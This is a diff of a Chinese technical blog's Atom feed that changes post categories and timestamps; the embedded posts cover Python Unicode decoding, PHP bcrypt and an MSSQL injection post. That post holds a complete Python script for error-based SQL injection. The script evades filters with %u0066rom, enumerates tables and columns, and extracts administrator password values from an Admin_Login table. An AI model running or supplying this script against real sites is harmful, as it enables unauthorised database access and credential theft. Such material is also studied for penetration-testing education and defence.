 <p>Example 2:<br>&gt;&gt;&gt; str<em> = “Russopho\xe9bic, clichd and just pl\xe9ain stupid.”<br>&gt;&gt;&gt; print str</em><br>Russopho?bic, clichd and just pl?ain stupid.<br>&gt;&gt;&gt; str<em> = str</em>.decode(“unicode<em>escape”)<br>&gt;&gt;&gt; print str</em><br>&emsp;&emsp;这个方法解决了我在插入数据到mongodb时遇到的“bson.errors.InvalidStringData: strings in documents must be valid UTF-8”问题。<br>&emsp;&emsp;附上关于这个问题的相关博客链接：<a href="http://www.cnblogs.com/yangze/archive/2010/11/16/1878469.html" target="_blank" rel="external">戳这里</a>。另外还有一个与unicode字节串有关的问题，遇到这样的错误提示：Unicode equal comparison failed to convert both arguments to Unicode - interpreting them as being unequal。说明我们在对两个字符（串）进行对比的时候等号两边的类型<br>不一样，可能是一边是unicode字节串，一边是字符串。详见<a href="http://stackoverflow.com/questions/3400171/python-utf-8-comparison。" target="_blank" rel="external">http://stackoverflow.com/questions/3400171/python-utf-8-comparison。</a></p>
@@ -719,7 +770,7 @@
     
     </summary>
     
-      <category term="编程" scheme="http://wps2015.org/categories/%E7%BC%96%E7%A8%8B/"/>
+      <category term="编程之美" scheme="http://wps2015.org/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E7%BE%8E/"/>
     
     
       <category term="python" scheme="http://wps2015.org/tags/python/"/>
@@ -731,7 +782,7 @@
     <link href="http://wps2015.org/2015/05/21/%7FBcrypt-in-php5.5/"/>
     <id>http://wps2015.org/2015/05/21/Bcrypt-in-php5.5/</id>
     <published>2015-05-21T06:58:55.000Z</published>
-    <updated>2016-05-15T12:33:55.428Z</updated>
+    <updated>2016-11-08T01:47:30.205Z</updated>
     
     <content type="html"><![CDATA[<p>在php5.5中，加入了一个新的密码哈希函数，可使用Bcrypt轻松实现加盐的安全密码。</p>
 <p>bcrypt和其他对称或非对称加密方式不同的是，不是直接解密得到明文，也不是二次加密比较密文，而是把明文和存储的密文一块运算得到另一个密文，如果这两个密文相同则验证成功。<a id="more"></a></p>
@@ -779,7 +830,7 @@
     <link href="http://wps2015.org/2015/04/07/script-of-mssql-error-based/"/>
     <id>http://wps2015.org/2015/04/07/script-of-mssql-error-based/</id>
     <published>2015-04-07T13:02:13.000Z</published>
-    <updated>2016-05-15T12:47:25.036Z</updated>
+    <updated>2016-11-08T01:44:35.011Z</updated>
     
     <content type="html"><![CDATA[<p>在进行mssql注入的时候，由于各种各样的原因，我们不能使用工具进行值得获取，那么可以自行编写脚本来获取值，python由于其良好的抓取网页的功能，被大家广泛使用。<a id="more"></a></p>
 <p>对于get型的mssql的报错注入,代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/</span><br><span class="line">env python</span><br><span class="line">#coding=utf-8</span><br><span class="line">import re</span><br><span class="line">import urllib</span><br><span class="line">import urllib2</span><br><span class="line">#从访问链接中获取报错信息</span><br><span class="line"></span><br><span class="line">def getcontent(payload):  #获取网页内容</span><br><span class="line">    url1=url+&quot;AND (&quot;+payload+&quot;)=1 --- &quot;</span><br><span class="line">    content = urllib.urlopen(url1).read()</span><br><span class="line">    print content</span><br><span class="line">    return  content</span><br><span class="line"></span><br><span class="line">#从报错回显中提取数值</span><br><span class="line">def getdata(content):</span><br><span class="line">    patt = re.compile(&quot;nvarchar.*?&apos;(.*?)&apos;.*?int&quot;)</span><br><span class="line">    data = patt.findall(content)</span><br><span class="line">    if data:</span><br><span class="line">        return data[0]</span><br><span class="line">    else:</span><br><span class="line">        return None</span><br><span class="line">#获取当前数据库名</span><br><span class="line">def getcurrentdb():</span><br><span class="line">    payload = &apos;db_name()&apos;</span><br><span class="line">    content = getcontent(payload)</span><br><span class="line">    data = getdata(content)</span><br><span class="line">    print &quot;current_db: &quot;+data</span><br><span class="line">    return data</span><br><span class="line">def gettablename(dbname,n):  #获取表名</span><br><span class="line">    tablelist1=[]</span><br><span class="line">    for i in range(n):</span><br><span class="line">        payload = &quot;select top 1 name %u0066rom &quot;+dbname+&quot;.dbo.sysobjects where xtype=&apos;U&apos; and name  not in(select top &quot;+str(i)+&quot; name %u0066rom &quot;+dbname+&quot;.dbo.sysobjects where xtype=&apos;U&apos; order by name) order by name&quot;</span><br><span class="line">        try:</span><br><span class="line">            content = getcontent(payload)</span><br><span class="line">            data = getdata(content)</span><br><span class="line">            #print data</span><br><span class="line">            if data not in tablelist1:</span><br><span class="line">                tablelist1.append(data)</span><br><span class="line">            else:</span><br><span class="line">                break</span><br><span class="line">        except:</span><br><span class="line">            continue</span><br><span class="line">    print tablelist1</span><br><span class="line">    print &apos;--------------------&apos;</span><br><span class="line"></span><br><span class="line">def getcolumns(dbname,table,n):  #获取列名</span><br><span class="line">    tablelist2=[]</span><br><span class="line">    for i in range(n):</span><br><span class="line">        payload=&quot;Select top 1 name %u0066rom &quot;+dbname+&quot;.dbo.SysColumns Where id=Object_Id(&apos;&quot;+table+&quot;&apos;) and name not in (Select top &quot;+str(i)+&quot; Name %u0066rom &quot;+dbname+&quot;.dbo.SysColumns Where id=Object_Id(&apos;&quot;+table+&quot;&apos;) order by name) order by name&quot;</span><br><span class="line">        try:</span><br><span class="line">            content = getcontent(payload)</span><br><span class="line">            data = getdata(content)</span><br><span class="line">            if  data not in tablelist2:</span><br><span class="line">                tablelist2.append(data)</span><br><span class="line">            else:</span><br><span class="line">                break</span><br><span class="line">        except:</span><br><span class="line">            continue</span><br><span class="line">    print table</span><br><span class="line">    print tablelist2</span><br><span class="line">    print &apos;--------------------&apos;</span><br><span class="line">def getvalue(dbname,table,column,n):  #获取各字段的值</span><br><span class="line">    tablelist3=[]</span><br><span class="line">    for i in range(n):</span><br><span class="line">        payload=&quot;select top 1 &quot;+column+&quot; %u0066rom &quot;+table+&quot; where &quot;+column+&quot; not in(select top  &quot;+str(i)+&quot; &quot;+column+&quot; %u0066rom &quot;+table+&quot; order by  id)order by id&quot;</span><br><span class="line">        try:</span><br><span class="line">            content = getcontent(payload)</span><br><span class="line">            data = getdata(content)  </span><br><span class="line">            if  data  not in tablelist3:</span><br><span class="line">                tablelist3.append(data)</span><br><span class="line">            else:</span><br><span class="line">                break</span><br><span class="line">        except:</span><br><span class="line">            continue</span><br><span class="line">    print column</span><br><span class="line">    print tablelist3</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    url=&quot;http://www.example/pages/BulletinPage.aspx?id=21&quot;</span><br><span class="line">    global url</span><br><span class="line">    db=getcurrentdb()</span><br><span class="line">    gettablename(&apos;saa&apos;,200)</span><br><span class="line">    getcolumns(db,&apos;Admin_Login&apos;,50)</span><br><span class="line">    getvalue(db,&apos;Admin_Login&apos;,&apos;LoginPwd&apos;,50)   #可自行选择注释，只留你需要的那个函数进行值得获取</span><br></pre></td></tr></table></figure></p>
@@ -791,7 +842,7 @@
     
     </summary>
     
-      <category term="渗透测试" scheme="http://wps2015.org/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+      <category term="Web安全" scheme="http://wps2015.org/categories/Web%E5%AE%89%E5%85%A8/"/>
     
     
       <category term="python" scheme="http://wps2015.org/tags/python/"/>
